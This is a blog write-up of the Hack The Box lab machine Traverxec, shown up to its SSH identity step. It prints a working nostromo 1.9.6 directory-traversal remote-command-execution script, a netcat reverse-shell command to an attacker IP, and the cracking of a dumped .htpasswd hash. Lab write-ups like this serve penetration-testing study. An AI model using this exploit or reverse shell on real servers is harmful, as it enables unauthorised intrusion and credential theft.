<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Always stay close to what keeps you feeling alive!">
    <meta name="author" content="Sabe Barker">

    <title>Traverxec - Hack The Box · Sabe Barker</title>

    <link rel="canonical" href="https://sabebarker.com/writeups/hackthebox/machines/traverxec/">

    <!-- Bootstrap core CSS -->
    <link href="/assets/css/bootstrap.min.css" rel="stylesheet">
	<!-- Custom CSS -->
    <link href="/assets/css/sabe.css" rel="stylesheet">
    <!-- Lightbox -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.css" rel="stylesheet">
    <!-- Favicons -->
	<link rel="apple-touch-icon" href="/assets/img/favicons/apple-touch-icon.png" sizes="180x180">
	<link rel="icon" href="/assets/img/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
	<link rel="icon" href="/assets/img/favicons/favicon-16x16.png" sizes="16x16" type="image/png">
	<link rel="manifest" href="/assets/img/favicons/manifest.json">
	<link rel="mask-icon" href="/assets/img/favicons/safari-pinned-tab.svg" color="#8248f6">
	<link rel="icon" href="/assets/img/favicons/favicon.ico">
	<meta name="apple-mobile-web-app-title" content="Sabe Barker">
	<meta name="application-name" content="Sabe Barker">
	<meta name="msapplication-TileColor" content="#fff">
	<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
	<meta name="theme-color" content="#fff">
	
    <!-- Twitter -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:site" content="@sabebarker">
    <meta name="twitter:creator" content="@sabebarker">
    <meta name="twitter:title" content="Traverxec - Hack The Box · Sabe Barker">
    <meta name="twitter:description" content="Always stay close to what keeps you feeling alive!">
    <meta name="twitter:image" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/traverxec/traverxec_infocard.png">

    <!-- Facebook -->
    <meta property="og:url" content="https://sabebarker.com/writeups/hackthebox/machines/traverxec/" />
    <meta property="og:title" content="Traverxec - Hack The Box · Sabe Barker">
    <meta property="og:description" content="Always stay close to what keeps you feeling alive!">
    <meta property="og:type" content="website">
    <meta property="og:image" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/traverxec/traverxec_infocard.png">
    <meta property="og:image:secure_url" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/traverxec/traverxec_infocard.png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <!-- Global site tag (gtag.js) - Google Analytics -->
	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-151243373-1"></script>
	<script>
  		window.dataLayer = window.dataLayer || [];
  		function gtag(){dataLayer.push(arguments);}
  		gtag('js', new Date());

  		gtag('config', 'UA-151243373-1');
	</script>
  </head>
  <body>
    <a class="skippy sr-only sr-only-focusable" href="#content">
      <span class="skippy-text">Skip to main content</span>
    </a>

    <header class="navbar navbar-expand navbar-light flex-column flex-md-row sb-navbar">
      <a class="navbar-brand mr-0 mr-md-2" href="/" aria-label="Sabe Barker"><svg id="Layer_35" enable-background="new 0 0 64 64" height="36" viewbox="0 0 64 64" width="36" class="d-inline-block align-top" style="margin-right: 10px;" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><lineargradient id="SVGID_1_" gradientunits="userSpaceOnUse" x1="32" x2="32" y1="63" y2="1"><stop offset="0" stop-color="#9f2fff"></stop><stop offset="1" stop-color="#0bb1d3"></stop></lineargradient><path d="m42.363 39.397 1.596 1.205c-.446.59-.85 1.22-1.202 1.872l-1.761-.949c.4-.742.86-1.458 1.367-2.128zm.887-1.079 1.5 1.322c1.863-2.112 3.182-4.677 3.814-7.416l-1.949-.45c-.557 2.417-1.721 4.68-3.365 6.544zm-4.689-23.805.878-1.797c-2.33-1.139-4.833-1.716-7.439-1.716s-5.109.577-7.439 1.716l.878 1.797c4.108-2.008 9.014-2.008 13.122 0zm14.439 13.487v.396c0 5.149-1.884 10.104-5.304 13.952-1.738 1.956-2.696 4.473-2.696 7.09v.562c0 3.859-3.14 7-7 7h-12c-3.86 0-7-3.141-7-7v-.562c0-2.616-.958-5.134-2.696-7.09-3.42-3.848-5.304-8.803-5.304-13.952v-.396c0-11.58 9.42-21 21-21s21 9.42 21 21zm-2 0c0-10.477-8.523-19-19-19s-19 8.523-19 19v.396c0 4.659 1.705 9.142 4.799 12.624 2.064 2.321 3.201 5.311 3.201 8.418v.562c0 2.757 2.243 5 5 5h12c2.757 0 5-2.243 5-5v-.562c0-3.106 1.137-6.097 3.201-8.418 3.094-3.482 4.799-7.965 4.799-12.624zm-10 18v4c0 1.654-1.346 3-3 3h-12c-1.654 0-3-1.346-3-3v-4c0-1.654 1.346-3 3-3h12c1.654 0 3 1.346 3 3zm-3-1h-1v2h2v-1c0-.552-.449-1-1-1zm-9 4v2h2v-2zm2-2v-2h-2v2zm2 4h2v-2h-2zm2-4v-2h-2v2zm-10-1v1h2v-2h-1c-.551 0-1 .448-1 1zm1 5h1v-2h-2v1c0 .552.449 1 1 1zm13-1v-1h-2v2h1c.551 0 1-.448 1-1zm-8.618-19h3.236l2.105 4.211c.181.361.277.767.277 1.171 0 1.443-1.174 2.618-2.618 2.618h-2.764c-1.444 0-2.618-1.175-2.618-2.618 0-.404.096-.81.276-1.171zm1.236 2-1.553 3.105c-.043.085-.065.181-.065.277 0 .341.277.618.618.618h2.764c.341 0 .618-.277.618-.618 0-.096-.022-.191-.065-.276l-1.553-3.106zm14.089-16.293-1.218 1.218c2.149 1.225 3.511 3.509 3.511 6.075 0 3.86-3.14 7-7 7-3.067 0-5.987-1.962-6.943-4.667l-.21-.595 10.446-10.446zm-2.708 2.709-6.809 6.809c.862 1.616 2.821 2.775 4.81 2.775 2.757 0 5-2.243 5-5 0-1.989-1.209-3.798-3.001-4.584zm-19.999 11.584c-3.86 0-7-3.14-7-7 0-2.567 1.362-4.851 3.511-6.075l-1.218-1.218 1.414-1.414 10.446 10.446-.21.595c-.956 2.704-3.876 4.666-6.943 4.666zm0-2c1.989 0 3.948-1.159 4.811-2.775l-6.809-6.809c-1.793.786-3.002 2.595-3.002 4.584 0 2.757 2.243 5 5 5zm-14.098-17.676 1.49 1.334c5.498-6.138 13.374-9.658 21.608-9.658v-2c-8.802 0-17.221 3.763-23.098 10.324zm23.098 49.676v2c9.308 0 18.04-4.128 23.958-11.325l-1.545-1.27c-5.537 6.734-13.706 10.595-22.413 10.595zm-28.969-27.649c.032.688.088 1.383.168 2.062l1.986-.232c-.074-.634-.127-1.28-.156-1.922zm4.132 9.256c-.252-.592-.486-1.196-.693-1.799l-1.891.652c.223.646.474 1.297.745 1.932zm-1.256-3.643c-.164-.615-.309-1.247-.429-1.879l-1.965.375c.129.679.285 1.358.461 2.02zm52.186-13.928c.165.617.309 1.249.429 1.879l1.965-.375c-.129-.677-.284-1.356-.461-2.02zm2.876 5.613c-.032-.689-.088-1.383-.168-2.063l-1.986.233c.074.633.127 1.28.156 1.922zm-4.132-9.256c.252.589.485 1.194.694 1.798l1.891-.652c-.224-.65-.475-1.3-.746-1.932zm6.163 21.607c0 1.654-1.346 3-3 3-.117 0-.228-.021-.342-.035-.628 1.241-1.323 2.455-2.112 3.602l-1.647-1.135c.733-1.063 1.377-2.189 1.96-3.338-.53-.541-.859-1.279-.859-2.094 0-1.654 1.346-3 3-3s3 1.346 3 3zm-2 0c0-.552-.449-1-1-1s-1 .448-1 1 .449 1 1 1 1-.448 1-1zm-52.199-28.404c-1.014 1.35-1.904 2.795-2.668 4.299.535.542.867 1.285.867 2.105 0 1.654-1.346 3-3 3s-3-1.346-3-3 1.346-3 3-3c.112 0 .219.021.328.033.821-1.623 1.779-3.183 2.874-4.639zm-3.801 6.404c0-.551-.449-1-1-1s-1 .449-1 1 .449 1 1 1 1-.449 1-1z" fill="url(#SVGID_1_)"></path></svg>{ sabebarker }
      </a>

      <div class="navbar-nav-scroll">
        <ul class="navbar-nav sb-navbar-nav flex-row">
          <li class="nav-item">
            <a class="nav-link " href="/search">
        <svg height="15" class="octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search" viewbox="0 0 16 16" version="1.1" width="15" aria-hidden="true"><path fill-rule="evenodd" d="M15.7 13.3l-3.81-3.83A5.93 5.93 0 0013 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 000-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z"></path></svg>
      </a>
          </li>
          <li class="nav-item">
            <a class="nav-link " href="/">
	      Home
	     </a>
          </li>
          <li class="nav-item">
            <a class="nav-link " href="/blog">
	      Blog
	    </a>
          </li>
          <li class="nav-item">
            <a class="nav-link active" href="/writeups">
	      Writeups
	    </a>
          </li>
          <li class="nav-item">
            <a class="nav-link " href="/tools">
	      Tools
	    </a>
          </li>
        </ul>
      </div>

      <ul class="navbar-nav flex-row ml-md-auto d-none d-md-flex">
        <li class="nav-item">
          <a class="nav-link p-2" href="https://github.com/sabebarker" target="_blank" rel="noopener" aria-label="GitHub"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewbox="0 0 512 499.36" role="img" focusable="false"><title>GitHub</title>
<path fill="currentColor" fill-rule="evenodd" d="M256 0C114.64 0 0 114.61 0 256c0 113.09 73.34 209 175.08 242.9 12.8 2.35 17.47-5.56 17.47-12.34 0-6.08-.22-22.18-.35-43.54-71.2 15.49-86.2-34.34-86.2-34.34-11.64-29.57-28.42-37.45-28.42-37.45-23.27-15.84 1.73-15.55 1.73-15.55 25.69 1.81 39.21 26.38 39.21 26.38 22.84 39.12 59.92 27.82 74.5 21.27 2.33-16.54 8.94-27.82 16.25-34.22-56.84-6.43-116.6-28.43-116.6-126.49 0-27.95 10-50.8 26.35-68.69-2.63-6.48-11.42-32.5 2.51-67.75 0 0 21.49-6.88 70.4 26.24a242.65 242.65 0 0 1 128.18 0c48.87-33.13 70.33-26.24 70.33-26.24 14 35.25 5.18 61.27 2.55 67.75 16.41 17.9 26.31 40.75 26.31 68.69 0 98.35-59.85 120-116.88 126.32 9.19 7.9 17.38 23.53 17.38 47.41 0 34.22-.31 61.83-.31 70.23 0 6.85 4.61 14.81 17.6 12.31C438.72 464.97 512 369.08 512 256.02 512 114.62 397.37 0 256 0z"></path></svg></a>
       </li>
       <li class="nav-item">
         <a class="nav-link p-2" href="https://twitter.com/sabebarker" target="_blank" rel="noopener" aria-label="Twitter"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewbox="0 0 512 416.32" role="img" focusable="false"><title>Twitter</title>
<path fill="currentColor" d="M160.83 416.32c193.2 0 298.92-160.22 298.92-298.92 0-4.51 0-9-.2-13.52A214 214 0 0 0 512 49.38a212.93 212.93 0 0 1-60.44 16.6 105.7 105.7 0 0 0 46.3-58.19 209 209 0 0 1-66.79 25.37 105.09 105.09 0 0 0-181.73 71.91 116.12 116.12 0 0 0 2.66 24c-87.28-4.3-164.73-46.3-216.56-109.82A105.48 105.48 0 0 0 68 159.6a106.27 106.27 0 0 1-47.53-13.11v1.43a105.28 105.28 0 0 0 84.21 103.06 105.67 105.67 0 0 1-47.33 1.84 105.06 105.06 0 0 0 98.14 72.94A210.72 210.72 0 0 1 25 370.84a202.17 202.17 0 0 1-25-1.43 298.85 298.85 0 0 0 160.83 46.92"></path></svg></a>
       </li>
       <li class="nav-item">
         <a class="nav-link p-2" href="https://facebook.com/sabebarker2600" target="_blank" rel="noopener" aria-label="Facebook"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewbox="0 0 24 24" role="img" focusable="false"><title>Facebook</title>
<path fill="currentColor" d="M210.787 234.832l68.31-22.883 22.1 65.977-68.309 22.882z"></path><path fill="currentColor" d="M23.9981 11.9991C23.9981 5.37216 18.626 0 11.9991 0C5.37216 0 0 5.37216 0 11.9991C0 17.9882 4.38789 22.9522 10.1242 23.8524V15.4676H7.07758V11.9991H10.1242V9.35553C10.1242 6.34826 11.9156 4.68714 14.6564 4.68714C15.9692 4.68714 17.3424 4.92149 17.3424 4.92149V7.87439H15.8294C14.3388 7.87439 13.8739 8.79933 13.8739 9.74824V11.9991H17.2018L16.6698 15.4676H13.8739V23.8524C19.6103 22.9522 23.9981 17.9882 23.9981 11.9991Z"></path></svg></a>
       </li>
      </ul>
    </header>


    <div class="container-fluid">
      <div class="row flex-xl-nowrap">
        <div class="col-12 col-md-3 col-xl-2 sb-sidebar">
          <button class="btn btn-link sb-search-docs-toggle d-md-none p-0 ml-3" type="button" data-toggle="collapse" data-target="#sb-docs-nav" aria-controls="sb-docs-nav" aria-expanded="false" aria-label="Toggle docs navigation"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewbox="0 0 30 30" role="img" focusable="false"><title>Menu</title>
<path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button>

<nav class="collapse sb-links" id="sb-docs-nav"><div class="sb-toc-item">
      <a class="sb-toc-link" href="/writeups/hackthebox/getting-started/introduction/">
        Getting Started
      </a>

      <ul class="nav sb-sidenav">
<li>
            <a href="/writeups/hackthebox/getting-started/introduction/">
              Introduction
            </a>
          </li>
<li>
            <a href="/writeups/hackthebox/getting-started/basic-setup/">
              Basic Setup
            </a>
          </li>
<li>
            <a href="/writeups/hackthebox/getting-started/vpn-setup/">
              VPN Setup
            </a>
          </li>
</ul>
    </div>
<div class="sb-toc-item active">
      <a class="sb-toc-link" href="/writeups/hackthebox/machines/openadmin/">
        Machines
      </a>

      <ul class="nav sb-sidenav">
<li>
            <a href="/writeups/hackthebox/machines/openadmin/">
              OpenAdmin
            </a>
          </li>
<li>
            <a href="/writeups/hackthebox/machines/mango/">
              Mango
            </a>
          </li>
<li class="active sb-sidenav-active">
            <a href="/writeups/hackthebox/machines/traverxec/">
              Traverxec
            </a>
          </li>
<li>
            <a href="/writeups/hackthebox/machines/forest/">
              Forest
            </a>
          </li>
<li>
            <a href="/writeups/hackthebox/machines/postman/">
              Postman
            </a>
          </li>
<li>
            <a href="/writeups/hackthebox/machines/scavenger/">
              Scavenger
            </a>
          </li>
<li>
            <a href="/writeups/hackthebox/machines/json/">
              Json
            </a>
          </li>
<li>
            <a href="/writeups/hackthebox/machines/ai/">
              AI
            </a>
          </li>
<li>
            <a href="/writeups/hackthebox/machines/bitlab/">
              Bitlab
            </a>
          </li>
<li>
            <a href="/writeups/hackthebox/machines/craft/">
              Craft
            </a>
          </li>
<li>
            <a href="/writeups/hackthebox/machines/networked/">
              Networked
            </a>
          </li>
</ul>
    </div></nav>
        </div>

        
          <div class="d-none d-xl-block col-xl-2 sb-toc">
            <ul class="section-nav">
<li class="toc-entry toc-h2">
<a href="#enumeration">Enumeration</a>
<ul>
<li class="toc-entry toc-h3"><a href="#portscan">Portscan</a></li>
</ul>
</li>
<li class="toc-entry toc-h2">
<a href="#foothold">Foothold</a>
<ul>
<li class="toc-entry toc-h4"><a href="#htpasswd">Htpasswd</a></li>
<li class="toc-entry toc-h4"><a href="#ssh-identity">SSH Identity</a></li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#user">User</a></li>
<li class="toc-entry toc-h2"><a href="#root">Root</a></li>
<li class="toc-entry toc-h2"><a href="#conclusion">Conclusion</a></li>
</ul>
          </div>
        

        <main class="col-12 col-md-9 col-xl-8 py-md-3 pl-md-5 sb-content" role="main">
          <h1 class="sb-title" id="content">Traverxec</h1>
          <p class="sb-lead">Always stay close to what keeps you feeling alive!</p>
          <p class="text-center"><img src="/assets/img/writeups/hackthebox/machines/traverxec/traverxec_infocard.png" alt="HackTheBox Traverxec Machine Info Card" class="img-fluid"></p>

<p><strong>Traverxec</strong> is an easy difficulty machine running Linux. It tests your knowledge in <em>Basic enumeration and privelege escalation</em> using a common exploit and GTFOBin.</p>

<p>Be sure to checkout the <a href="/writeups/hackthebox/getting-started/basic-setup/">Basic Setup</a> section  before you get started.</p>

<h2 id="enumeration">Enumeration</h2>

<p>Like always, enumeration is our first port of call. Let’s take a look at the machine and see what we are dealing with.</p>

<h3 id="portscan">Portscan</h3>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">portscan traverxec.htb <span class="nt">-oX</span> nmap.xml
Grabbing ports...
Ports grabbed!
Scanning...
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-12-04 17:15 PST
Nmap scan report <span class="k">for </span>traverxec.htb <span class="o">(</span>10.10.10.165<span class="o">)</span>
Host is up <span class="o">(</span>0.22s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c <span class="o">(</span>RSA<span class="o">)</span>
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>14.45 seconds</code></pre></figure>

<p>We see <code class="highlighter-rouge">port 80</code> open and straight away we notice <code class="highlighter-rouge">nostromo 1.9.6</code>.</p>

<h2 id="foothold">Foothold</h2>

<p>Using <code class="highlighter-rouge">searchsploit</code> we find some vulns:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">searchsploit nostromo
<span class="nt">---------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">----------------------------------------</span>
 Exploit Title                                                                                                                                                       |  Path
                                                                                                                                                                     | <span class="o">(</span>/usr/share/exploitdb/<span class="o">)</span>
<span class="nt">---------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">----------------------------------------</span>
Nostromo - Directory Traversal Remote Command Execution <span class="o">(</span>Metasploit<span class="o">)</span>                                                                                                 | exploits/multiple/remote/47573.rb
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution                                                                                                 | exploits/linux/remote/35466.sh
<span class="nt">---------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">----------------------------------------</span>
Shellcodes: No Result
Papers: No Result</code></pre></figure>

<p>We will take a look at <code class="highlighter-rouge">35466.sh</code> script to see what that’s about. Searchsploit scripts notoriously have different unicode formats and whitespace from other operating systems and what not that cause the script to fail or run incorrectly. Not only that but they generally have comments that don’t use comment syntax of the language it is written in. So open up the file with your preferred editor and just take what you need.</p>

<p>We end up with the following:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nano nhttpd.sh
<span class="c">#!/bin/sh</span>
<span class="c">######################################</span>
<span class="c">#                                    #</span>
<span class="c">#  RedTeam Pentesting GmbH           #</span>
<span class="c">#  kontakt@redteam-pentesting.de     #</span>
<span class="c">#  http://www.redteam-pentesting.de  #</span>
<span class="c">#                                    #</span>
<span class="c">######################################</span>

<span class="k">if</span> <span class="o">[</span> <span class="nv">$# </span><span class="nt">-lt</span> 3 <span class="o">]</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">echo</span> <span class="s2">"Usage: </span><span class="si">$(</span><span class="nb">basename</span> <span class="nv">$0</span><span class="si">)</span><span class="s2"> HOST PORT COMMAND..."</span>
    <span class="nb">exit </span>2
<span class="k">fi


</span><span class="nv">HOST</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>
<span class="nv">PORT</span><span class="o">=</span><span class="s2">"</span><span class="nv">$2</span><span class="s2">"</span>
<span class="nb">shift </span>2

<span class="o">(</span> <span class="se">\</span>
    <span class="nb">echo</span> <span class="nt">-n</span> <span class="nt">-e</span> <span class="s1">'POST /..%2f..%2f..%2fbin/sh HTTP/1.0\r\n'</span><span class="p">;</span> <span class="se">\</span>
    <span class="nb">echo</span> <span class="nt">-n</span> <span class="nt">-e</span> <span class="s1">'Content-Length: 1\r\n\r\necho\necho\n'</span><span class="p">;</span> <span class="se">\</span>
    <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$@</span><span class="s2"> 2&gt;&amp;1"</span> <span class="se">\</span>
<span class="o">)</span> | nc <span class="s2">"</span><span class="nv">$HOST</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$PORT</span><span class="s2">"</span> <span class="se">\</span>
  | <span class="nb">sed</span> <span class="nt">--quiet</span> <span class="nt">--expression</span> <span class="s1">':S;/^\r$/{n;bP};n;bS;:P;n;p;bP'</span></code></pre></figure>

<p>Upon running this script as is it runs without errors but nothing happens. At closer inspection we see the url encode <code class="highlighter-rouge">..%2f..%2f..%2</code> which equates to <code class="highlighter-rouge">../../../</code> our directory traversal.</p>

<p>Changing this to a carriage return instead, such as <code class="highlighter-rouge">.%0d./.%0d./.%0d./.%0d.</code> and changing <code class="highlighter-rouge"><span class="c">#!/bin/sh</span></code> to <code class="highlighter-rouge"><span class="c">#!/bin/bash</span></code> fixes the issue:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">./nhttpd.sh traverxec.htb 80 <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span></code></pre></figure>

<p>Now lets connect with <code class="highlighter-rouge">netcat</code>.</p>

<p>First setup our netcat listener:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nc <span class="nt">-lvp</span> 1234</code></pre></figure>

<p>Then we use our local script to issue our netcat command  remotely on <code class="highlighter-rouge">traverxec</code>:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">./nhttpd.sh traverxec.htb 80 <span class="nb">nohup </span>nc &lt;attacker-ip&gt; 1234 <span class="nt">-e</span> /bin/bash &amp;</code></pre></figure>

<p>From here we can <a href="/writeups/pentesting-cheatsheets/privilege-escalation/linux/#upgrade-shell">upgrade</a> the shell!</p>

<p>Ok so we are in as user <code class="highlighter-rouge">www-data</code> and our working directory is <code class="highlighter-rouge">/usr/bin</code>.</p>

<p>First things first let’s see what other users we have on this machine. Taking a look in <code class="highlighter-rouge">/home</code> we see a user called <code class="highlighter-rouge">david</code> but we see that we do not have permissions to access their home directory.</p>

<h4 id="htpasswd">Htpasswd</h4>

<p>Next we will do a search for hidden files to see if we uncover anything:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">www-data@traverxec:/usr/bin<span class="nv">$ </span>find / <span class="nt">-name</span> <span class="s2">".*"</span> <span class="nt">-ls</span> 2&gt;&amp;1 | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"Permission denied"</span>
.... SNIP ....		.... SNIP ....		.... SNIP ....
11005      4 <span class="nt">-rw-r--r--</span>   1 root     bin            41 Oct 25 15:20 /var/nostromo/conf/.htpasswd</code></pre></figure>

<p>Having a look inside this file we find a hash:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">www-data@traverxec:/usr/bin<span class="nv">$ </span><span class="nb">cat</span> /var/nostromo/conf/.htpasswd
david:<span class="nv">$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ</span>/</code></pre></figure>

<p>Let’s take this over to our attacker machine and see if we can crack it:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">john htpasswd.txt <span class="nt">--wordlist</span><span class="o">=</span>/root/wordlists/passwords.txt
Warning: detected <span class="nb">hash type</span> <span class="s2">"md5crypt"</span>, but the string is also recognized as <span class="s2">"md5crypt-long"</span>
Use the <span class="s2">"--format=md5crypt-long"</span> option to force loading these as that <span class="nb">type </span>instead
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>md5crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$1$ </span><span class="o">(</span>and variants<span class="o">)</span> <span class="o">[</span>MD5 256/256 AVX2 8x3]<span class="o">)</span>
Will run 4 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Now....4me       <span class="o">(</span>?<span class="o">)</span>
1g 0:00:14:48 DONE <span class="o">(</span>2019-12-05 00:05<span class="o">)</span> 0.001125g/s 312184p/s 312184c/s 312184C/s NuGiEr37..Novara
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed</code></pre></figure>

<p>Ok so we have a password. Now let’s go see where we can use it.</p>

<p>It doesn’t work with <code class="highlighter-rouge">ssh</code> or <code class="highlighter-rouge">su david</code> so we need to know more about how <code class="highlighter-rouge">nostromo</code> works and where the <code class="highlighter-rouge">.htpasswd</code> is being used.</p>

<p>Doing some research about <code class="highlighter-rouge">nostromo</code> it seems that the folder that stores the configuration files is <code class="highlighter-rouge">/var/nostromo/conf</code> where we found our <code class="highlighter-rouge">.htpaswd</code>. Let’s take a look in this directory and see if there is anything interesting:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">www-data@traverxec:/usr/bin<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /var/nostromo/conf
total 8
<span class="nt">-rw-r--r--</span> 1 root bin 2928 Oct 25 14:26 mimes
<span class="nt">-rw-r--r--</span> 1 root bin  498 Oct 25 15:20 nhttpd.conf</code></pre></figure>

<p>We need to know more about how <code class="highlighter-rouge">nostromo</code>’s configuration works so we will open up the manpage with <code class="highlighter-rouge">man nhttpd</code> so we have a reference for the configuration file.</p>

<p>Now let’s have a look at how things are set up:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">www-data@traverxec:/var/nostromo/conf<span class="nv">$ </span><span class="nb">cat </span>nhttpd.conf 
<span class="c"># MAIN [MANDATORY]</span>

servername		traverxec.htb
serverlisten		<span class="k">*</span>
serveradmin		david@traverxec.htb
serverroot		/var/nostromo
servermimes		conf/mimes
docroot			/var/nostromo/htdocs
docindex		index.html

<span class="c"># LOGS [OPTIONAL]</span>

logpid			logs/nhttpd.pid

<span class="c"># SETUID [RECOMMENDED]</span>

user			www-data

<span class="c"># BASIC AUTHENTICATION [OPTIONAL]</span>

htaccess		.htaccess
htpasswd		/var/nostromo/conf/.htpasswd

<span class="c"># ALIASES [OPTIONAL]</span>

/icons			/var/nostromo/icons

<span class="c"># HOMEDIRS [OPTIONAL]</span>

homedirs		/home
homedirs_public		public_www</code></pre></figure>

<p>Looking at the config a couple of things stand out. We have the <code class="highlighter-rouge">Basic Authentication</code> set up and can see that the password hash is located at <code class="highlighter-rouge">/var/nostromo/conf/.htpasswd</code> of which we have already cracked.</p>

<p>The other thing that stands out is that there is a section called <code class="highlighter-rouge">HOMEDIRS</code>. I am assuming this is similar to apache.</p>

<p>On reviewing the manual we see that <code class="highlighter-rouge">homedirs</code> sets up a path on the webserver to any users home directories found in <code class="highlighter-rouge">/home</code>. We see that to access a users home directory from the webserver we need to append the username to the url such as <code class="highlighter-rouge">http://traverxec.htb/~david</code>.</p>

<p>In going to this page we are presented with a message:</p>

<p><a href="/assets/img/writeups/hackthebox/machines/traverxec/traverxec.htb_david.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/traverxec/traverxec.htb_david.png" alt="Traverxec David Screenshot" class="img-fluid"></a></p>

<p>Looking further in to the <code class="highlighter-rouge">HOMEDIRS</code> config within the manual we also see that one can restrict access to a sub folder rather than giving access to the users whole home directory. This has been set to <code class="highlighter-rouge">public_www</code>.</p>

<p>Let’s see if we can take a peak in this directory:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">www-data@traverxec:/var/nostromo/conf<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /home/david/public_www
total 8
<span class="nt">-rw-r--r--</span> 1 david david  402 Oct 25 15:45 index.html
drwxr-xr-x 2 david david 4096 Oct 25 17:02 protected-file-area</code></pre></figure>

<p>And there is our protected folder it seems. Let’s go see if the <code class="highlighter-rouge">password</code> works with the username <code class="highlighter-rouge">david</code> at the web address <code class="highlighter-rouge">http://traverxec.htb/~david/protected-file-area</code>:</p>

<p><a href="/assets/img/writeups/hackthebox/machines/traverxec/traverxec.htb_protected-file-area.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/traverxec/traverxec.htb_protected-file-area.png" alt="Traverxec Protected File Area Screenshot" class="img-fluid"></a></p>

<p>Yep we get access and get a directory index with the file <code class="highlighter-rouge">backup-ssh-identity-files.tgz</code>. That will be our ssh access, w00t!</p>

<h4 id="ssh-identity">SSH Identity</h4>

<p>We download the file and unzip it and take a look in <code class="highlighter-rouge">/home/david/.ssh</code>. Remember, dot files and folders are hidden so when you look in the extracted folders it will look like there is nothing there. Use the command <code class="highlighter-rouge">ls -la</code> to show them.</p>

